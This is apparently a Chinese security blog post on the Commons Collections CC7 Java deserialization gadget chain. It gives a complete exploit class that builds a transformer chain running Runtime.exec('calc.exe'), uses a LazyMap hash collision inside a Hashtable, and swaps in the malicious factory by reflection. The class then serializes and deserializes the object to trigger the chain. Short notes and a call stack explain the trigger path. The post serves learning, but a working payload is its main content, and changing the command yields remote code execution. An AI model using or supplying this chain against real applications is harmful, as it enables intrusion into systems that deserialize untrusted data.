---
title: CC7链
date: 2026-03-28
updated: 2026-03-28
tags:
  - 链子
categories:
  - 链子
description: CC7链
published: true
---
```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class CC7Exp {

    public static void main(String[] args) throws Exception {

        // 1. 构造核心的恶意执行链
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);

        // 2. 假链
        Transformer[] fakeTransformers = new Transformer[]{};
        Transformer fakeChain = new ChainedTransformer(fakeTransformers);

        // 3. 准备两个 LazyMap
        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();
        Map lazyMap1 = LazyMap.decorate(innerMap1, fakeChain);
        Map lazyMap2 = LazyMap.decorate(innerMap2, fakeChain);

        // 4. 制造哈希碰撞
        lazyMap1.put("yy", 1);
        lazyMap2.put("zZ", 1);

        // 5. 构造入口 Hashtable 并放入数据
        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);

        // 此处触发哈希碰撞：lazyMap1.equals(lazyMap2) -> lazyMap2.get("yy")
        // lazyMap2 中会多出一个由于 get() 触发而生成的键值对：{"yy": null}
        hashtable.put(lazyMap2, 2);

        // 替换为真正的恶意链 (注意：因为最终是 lazyMap2 被触发 get("yy")，所以恶意链必须绑在 lazyMap2 上)
        Field factoryField = LazyMap.class.getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazyMap2, transformerChain);

        lazyMap2.remove("yy");

        byte[] bytes = serialize(hashtable);
        System.out.println("序列化完成，准备触发反序列化...");

        unserialize(bytes);
    }

    public static byte[] serialize(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return baos.toByteArray();
    }

    public static void unserialize(byte[] data) throws Exception {
        ByteArrayInputStream bais = new ByteArrayInputStream(data);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }
}
```

哈希表在存放元素时，如果发现两个不同的元素算出来的 Hash 值一模一样（也就是发生了碰撞），它就需要进一步确认：为了确认这两个元素是否是一个东西，`Hashtable` 会调用后一个元素的 `equals()` 方法去和前一个元素进行比对。

在 Payload 中构造了两个特殊的 `LazyMap`（Map1、Map2），并且故意让它们的 Hash 值完全相同。当反序列化把 Map2 放进 `Hashtable` 时，发生了碰撞。于是触发了 `Map2.equals(Map1)`。`LazyMap` 没有自己的 `equals` 方法，它会向上调用父类 `AbstractMap` 的 `equals` 方法。

![[attachments/20260328210908.png]]

在 `reconstitutionPut` 中，如果发生哈希碰撞，会调用 `e.key.equals(key)` 来检查 key 是否相同

![[attachments/20260328210942.png]]

`lazyMap1` 和 `lazyMap2` 都是 `LazyMap` 对象，`LazyMap` 继承自 `AbstractMapDecorator`，没有重写 `equals` 方法，所以会调用 `AbstractMap` 的 `equals`

![[attachments/20260328211036.png]]

`AbstractMap` 是判断两个 Map 是否相等，它的逻辑是：遍历 Map2 里的所有 key，然后去 Map1 里挨个 `get(key)`，查看取出来的值是不是一样。它去 Map1 里执行了 `Map1.get(key)`。如果这个 key 在 Map1 里不存在，触发机制就被彻底激活了，`LazyMap` 的工厂就会直接带着恶意的 `ChainedTransformer` 爆发。

![[attachments/20260328211110.png]]

后面和之前就一样了

```
ois.readObject() <=> ObjectInputStream.readObject()
Hashtable::readObject()
	->Hashtable::reconstitutionPut()
	->AbstractMapDecorator::equals()
	->AbstractMap::equals()
	->LazyMap::get()
	->ChainedTransformer::transform()
	->InvokerTransformer::transform()
```